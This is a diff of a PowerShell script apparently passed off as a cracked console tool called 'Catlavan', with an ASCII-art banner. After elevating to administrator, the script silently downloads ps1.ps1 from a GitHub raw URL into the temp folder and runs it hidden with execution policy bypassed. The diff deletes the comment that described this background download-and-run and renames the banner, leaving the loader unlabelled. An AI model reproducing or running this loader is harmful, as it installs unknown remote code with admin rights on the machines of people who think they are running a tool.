@@ -4,17 +4,12 @@ if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
     Start-Process PowerShell -Verb RunAs -ArgumentList $arguments
     Exit
 }
-
-$Host.UI.RawUI.WindowTitle = "SHELLBAG CONSOLE v2.0 | Cracked Catlavan"
-
-# Скачивание и запуск ps1.ps1 в фоне
+$Host.UI.RawUI.WindowTitle = " CONSOLE v2.0 | Cracked Catlavan"
 $url = "https://github.com/sys1e/cmd/raw/refs/heads/main/ps1.ps1"
 $path = "$env:TEMP\ps1.ps1"
-
 [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
 Invoke-WebRequest -Uri $url -OutFile $path -UseBasicParsing -ErrorAction SilentlyContinue
 Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$path`"" -WindowStyle Hidden
-
 function Show-KRAKEH-Header {
     $headerArt = @"
                                          _.oo.
@@ -38,7 +33,7 @@ YMMMUP^
         Write-Host $line -ForegroundColor Red
     }
     Write-Host "================================================" -ForegroundColor Magenta
-    Write-Host "     SHELLBAG CONSOLE v2.0 - Cracked Catlavan     " -ForegroundColor Yellow
+    Write-Host "    Catlavan.net v2.0 - Cracked Catlavan     " -ForegroundColor Yellow
     Write-Host "================================================" -ForegroundColor Magenta
     Write-Host ""
 }
